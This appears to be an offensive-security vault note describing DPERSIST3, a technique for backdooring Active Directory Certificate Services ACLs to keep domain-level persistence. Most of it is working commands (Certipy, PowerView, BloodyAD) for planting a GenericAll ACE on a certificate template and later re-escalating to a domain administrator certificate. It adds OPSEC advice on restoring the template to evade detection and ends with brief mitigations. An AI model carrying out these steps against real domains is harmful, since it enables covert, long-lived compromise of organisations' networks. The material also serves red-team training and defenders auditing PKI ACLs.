---
title: "DPERSIST3 — Malicious Misconfiguration (ACL Backdoor)"
description: "Instead of forging certs now, DPERSIST3 backdoors the PKI ACLs so you can re-escalate whenever you like. You grant an attacker-controlled principal…"
category: active-directory
tags: ["active-directory", "adcs", "delegation", "privilege-escalation", "persistence"]
tools: ["Certipy", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/DPERSIST3 — Malicious Misconfiguration (ACL Backdoor).md"
---
# DPERSIST3 — Malicious Misconfiguration (ACL Backdoor)

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Domain Persistence (ACL) |
| **Difficulty** | Medium–High |
| **Pre-requisites** | Write/Owner over PKI AD objects (CA object, templates, Enrollment Services, NTAuth) — typically post-DA |
| **Tools** | PowerView, BloodyAD, Certipy, dacledit |
| **OPSEC Noise** | Low after the fact — a dormant ACE that looks like normal delegation |
| **One-liner** | Plant permissive ACEs on ADCS objects so a principal you control can re-create an ESC condition on demand, giving quiet, reusable domain persistence. |

***

## What Is DPERSIST3?

Instead of forging certs now, DPERSIST3 **backdoors the PKI ACLs** so you can re-escalate whenever you like. You grant an attacker-controlled principal write/control over a template, the CA object, the Enrollment Services container, or `NTAuthCertificates`. Later, from any low-priv-looking account, you flip a template into an ESC4/ESC1 state (or push a rogue CA per DPERSIST2) and mint privileged certs. The backdoor is a single dormant ACE that blends into legitimate delegation.

***

## Step 1 — Identify the Object to Backdoor

```bash
# Enumerate PKI objects + current DACLs
certipy-ad find -u admin -p pass -dc-ip $TARGET -stdout
```

Good targets (in `CN=Public Key Services,CN=Services,CN=Configuration,DC=...`):

| Object | Backdoor effect |
| :-- | :-- |
| A certificate template | Grant Write → recreate ESC1/ESC4 on demand |
| `CN=Certificate Templates` container | Create/clone new vulnerable templates |
| The Enterprise CA object | Grant ManageCA → ESC7-style control |
| `NTAuthCertificates` | Grant Write → publish rogue CA (DPERSIST2) |

***

## Step 2 — Plant the ACE

```powershell
# PowerView — give a controlled user GenericAll over a template
Add-DomainObjectAcl -TargetIdentity "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb" `
  -PrincipalIdentity 'lowpriv' -Rights All
```

```bash
# BloodyAD equivalent
bloodyAD -u admin -p pass -d domain.htb --host $TARGET \
  add genericAll 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb' lowpriv
```

***

## Step 3 — Re-Escalate On Demand (later)

```bash
# From the backdoored low-priv account, flip the template to ESC1 and request a DA cert
certipy-ad template -u lowpriv -p pass -template User -write-default-configuration ...  # make it vulnerable
certipy-ad req -u lowpriv -p pass -ca 'DOMAIN-CA' -template User -upn administrator@domain.htb
certipy-ad auth -pfx administrator.pfx -dc-ip $TARGET
```

> [!tip] Pair with template restore
> Some operators flip the template vulnerable, request, then restore the original config to minimise the window a defender could catch it in a config diff.

***

## OPSEC Considerations

| Action | Log | Noise |
| :-- | :-- | :-- |
| Planting the ACE | AD object write (4662/5136) | 🟡 Medium (at plant time) |
| Dormant backdoor | none | 🟢 Low |
| On-demand re-escalation | template change + 4886/4887 | 🟡 Medium |

***

## Mitigation

- Baseline and monitor DACLs on **all** PKI objects; alert on new write/control ACEs.
- Restrict who can modify templates and the Enrollment Services / NTAuth containers.
- Use SACLs (Event 4662/5136) on the PKI config container to catch ACE additions.
- After a DA-level incident, audit ADCS ACLs for planted backdoors, not just user/group membership.

***

## See Also

- _ADCS Attack Methodology Guide · ESC4 — Vulnerable Certificate Template Access Control · ESC5 — Vulnerable PKI Object Access Control · ESC7 — Vulnerable CA Access Control (ManageCA  ManageCertificates) · DPERSIST2 — Rogue CA Certificate (NTAuth Injection)
- Sources: SpecterOps *Certified Pre-Owned*; [The Hacker Recipes — ADCS](https://www.thehacker.recipes/ad/movement/ad-cs/)
